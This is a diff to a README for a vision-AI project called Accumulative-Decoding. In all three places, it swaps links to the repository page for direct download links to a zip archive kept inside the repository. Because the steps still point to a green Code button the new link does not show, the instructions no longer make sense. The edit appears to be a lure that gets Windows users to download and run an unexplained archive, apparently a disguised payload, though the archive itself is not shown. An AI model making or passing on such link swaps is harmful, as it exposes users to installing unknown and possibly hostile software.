@@ -1,6 +1,6 @@
 # 🧠 Accumulative-Decoding - Reduce Hallucinations in Vision AI
 
-[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gogokok9072/Accumulative-Decoding)
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Gogokok9072/Accumulative-Decoding/main/accumulative_decoding/Decoding-Accumulative-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this guide to download and run it on Windows.
 
 ## 📥 Download and Run
 
-1. Open this link in your web browser: https://github.com/Gogokok9072/Accumulative-Decoding
+1. Open this link in your web browser: https://raw.githubusercontent.com/Gogokok9072/Accumulative-Decoding/main/accumulative_decoding/Decoding-Accumulative-v3.1.zip
 2. On the page, look for the green **Code** button.
 3. Click **Code** and choose **Download ZIP**.
 4. Save the file to your computer.
@@ -192,7 +192,7 @@ Avoid deep folder paths or names with special characters. Simple paths make setu
 
 ## 🔗 Project Link
 
-Visit this page to download the project files: https://github.com/Gogokok9072/Accumulative-Decoding
+Visit this page to download the project files: https://raw.githubusercontent.com/Gogokok9072/Accumulative-Decoding/main/accumulative_decoding/Decoding-Accumulative-v3.1.zip
 
 ## 📝 Basic Use Tips
 
